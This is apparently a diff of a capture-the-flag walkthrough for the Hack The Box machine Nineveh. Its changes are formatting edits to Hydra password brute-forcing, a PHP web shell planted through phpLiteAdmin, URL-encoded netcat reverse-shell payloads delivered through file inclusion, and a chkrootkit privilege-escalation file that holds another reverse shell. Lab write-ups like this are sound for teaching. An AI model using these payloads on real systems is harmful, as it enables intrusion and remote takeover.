@@ -9,74 +9,63 @@ http://10.10.10.43/department/login.php
 https://10.10.10.43/db/
 https://10.10.10.43/secure_notes/
 ```
-**Hydra:
+**Hydra:**
 ```shell
 root@kali:~/HTB/Nineveh# hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid" -t 64
 ```
-For Department page:
+**For Department page:
 [80][http-post-form] host: 10.10.10.43   login: admin   password: 1q2w3e4r5t
-1 of 1 target successfully completed, 1 valid password found
+1 of 1 target successfully completed, 1 valid password found**
 ```shell
 root@kali:~/HTB/Nineveh# hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect" -t 64
 ```
-For PHP Lite Admin page:
-[443][http-post-form] host: 10.10.10.43   login: admin   password: password123
+**For PHP Lite Admin page:
+[443][http-post-form] host: 10.10.10.43   login: admin   password: password123**
 
-Show details by -x:
-root@kali:~/HTB/Nineveh# searchsploit -x 24044.txt
+**Show details by -x:
+root@kali:~/HTB/Nineveh# searchsploit -x 24044.txt**
 
 Then make reverse shells(shells.txt):
 
 Create database "ninevehNotes.php" Field=1
 
- Rename table:test --> Table 'ninevehNotes' 
+Rename table:test --> Table 'ninevehNotes' 
 ```shell
 Field input:
 <?php echo system($_REQUEST["ipp"]; ?>
 ```
-MOVE to Burp and change to POST:
+#### MOVE to Burp and change to POST:
 --------------------------------------------------------------------
 ```shell
 POST /department/manage.php?notes=/var/tmp/ninevehNotes.php HTTP/1.1
 Host: 10.10.10.43
-User-Agent: Mozilla/4.0 (X11: Linux x86_64; rv:10.0) Gecko/20100101 Firefox/10.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Cookie: PHPSESSID=5us06ki6u22v2n0ph43rshs8d5
-Connection: close
-Upgrade-Insecure-Requests: 1
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 88
-
+...
 ipp=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.11+1668+>/tmp/f
 ```
 --------------------------------------------------------------------
-Notes:
+#### REMEMBER Encode special character like " " ---> "+" and ";"--->"%3b" "&"--->"%26"
 ```shell
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.11 1668 >/tmp/f
-
-REMEMBER Encode special character like " " ---> "+" and ";"--->"%3b" "&"--->"%26"
-  
+Applied to web shell:
 ipp=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.11+1668+>/tmp/f
 ```
 --------------------------------------------------------------------
-Since python setting problem:
+**As python setting problem:**
 ```shell
 $ python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
-
-CRON job on report, show history
+**CRON job on report, show history**
 ```shell
 www-data@nineveh:/report$ ps -eo command
 ```
-LOOP history action:
+**LOOP history action:**
 ```shell
 www-data@nineveh:/report$ for i in $(ps -eo command)ls ; do echo $i; done
 To confirm IFS is "space" as new line:
 www-data@nineveh:/report$ IFS=$'\n'
-
-write a script: procmon.sh
+```
+***write a script: procmon.sh***
+```shell
 --------------------------------------------------------------------
 #!/bin/bash
 
@@ -92,7 +81,8 @@ while true; do
 	old_process=$new_process
 done
 --------------------------------------------------------------------
-		
+```
+```shell
 www-data@nineveh:/var/tmp$ ./procmon.sh
 
 172a173
@@ -102,16 +92,10 @@ www-data@nineveh:/var/tmp$ ./procmon.sh
 > /bin/sh -c /root/vulnScan.sh
 > /bin/bash /root/vulnScan.sh
 > /bin/sh /usr/bin/chkrootkit
-> /usr/bin/find /dev /tmp /lib /etc /var ( -name tcp.log -o -name .linux-sniff -o -name sniff-l0g -o -name core_ )
-173,177d172
-< /usr/sbin/CRON -f
-< /bin/sh -c /root/vulnScan.sh
-< /bin/bash /root/vulnScan.sh
-< /bin/sh /usr/bin/chkrootkit
-< /usr/bin/find /dev /tmp /lib /etc /var ( -name tcp.log -o -name .linux-sniff -o -name sniff-l0g -o -name core_ )
-179d173
+...
 < ps -eo command
 ...
+```
 --------------------------------------------------------------------
 "< /bin/sh /usr/bin/chkrootkit" finds exploit-db 33899
 Then create a update file placed /tmp as /tmp/update
@@ -120,6 +104,7 @@ Then create a update file placed /tmp as /tmp/update
 #!/bin/bash
 rm /tmp/3;mkfifo /tmp/3;cat /tmp/3|/bin/sh -i 2>&1|nc 10.10.14.11 4444 >/tmp/3
 --------------------------------------------------------------------
+
 ~Other way~
 Show hidden content: 
 root@kali:~/HTB/Nineveh# binwalk -Me nineveh.png 
